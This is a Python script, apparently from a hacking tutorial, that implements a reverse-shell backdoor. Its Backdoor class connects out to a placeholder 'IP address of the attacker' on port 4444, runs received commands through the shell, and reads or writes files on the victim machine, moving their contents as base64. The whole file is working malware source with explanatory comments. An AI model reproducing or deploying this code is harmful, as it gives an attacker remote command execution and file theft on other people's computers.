#!/usr/bin/python
import socket  # Import the socket library for network communication
import subprocess  # Import the subprocess module for running external commands
import json  # Import the json module for JSON data handling
import os  # Import the os module for file and directory operations
import base64  # Import the base64 module for encoding and decoding binary data
import sys  # Import the sys module for system-related functions

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a socket for IPv4 and TCP communication
        self.connection.connect((ip, port))  # Connect to the specified IP and port

    def reliable_send(self, data):
        if isinstance(data, bytes):
            data = data.decode()  # Decode bytes data to string if needed
        json_data = json.dumps(data)  # Serialize data to JSON format
        self.connection.send(json_data.encode())  # Send the JSON-encoded data over the connection

    def reliable_receive(self):
        json_data = b""  # Initialize an empty bytes object for receiving data
        while True:
            try:
                part = self.connection.recv(1024)  # Receive data in 1024-byte chunks
                json_data += part
                return json.loads(json_data.decode())  # Deserialize JSON data and return it
            except ValueError:
                continue

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')  # Open /dev/null for discarding output (Linux/Unix)
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)  # Execute a system command

    def change_working_directory_to(self, path):
        os.chdir(path)  # Change the working directory to the specified path
        return "[+] Changing working directory to " + path  # Return a success message

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()  # Read and encode the file content as base64

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))  # Decode and write the base64-encoded content to a file
            return "[+] Upload successful."  # Return a success message

    def run(self):
        while True:
            command = self.reliable_receive()  # Receive a command from the remote host

            if command[0] == "exit":
                self.connection.close()
                sys.exit()  # Close the connection and exit if the command is "exit"
            elif command[0] == "cd" and len(command) > 1:
                result = self.change_working_directory_to(command[1])  # Change the working directory
            elif command[0] == "download" and len(command) > 1:
                result = self.read_file(command[1])  # Read a file and encode its content as base64
            elif command[0] == "upload" and len(command) > 2:
                result = self.write_file(command[1], command[2])  # Write content to a file
            else:
                result = self.execute_system_command(command)  # Execute a system command remotely

            self.reliable_send(result)  # Send the result of the executed command back to the remote host

# Create an instance of the Backdoor class with the attacker's IP address and port
my_backdoor = Backdoor("IP address of the attacker", 4444)
my_backdoor.run()  # Start the backdoor to handle incoming commands
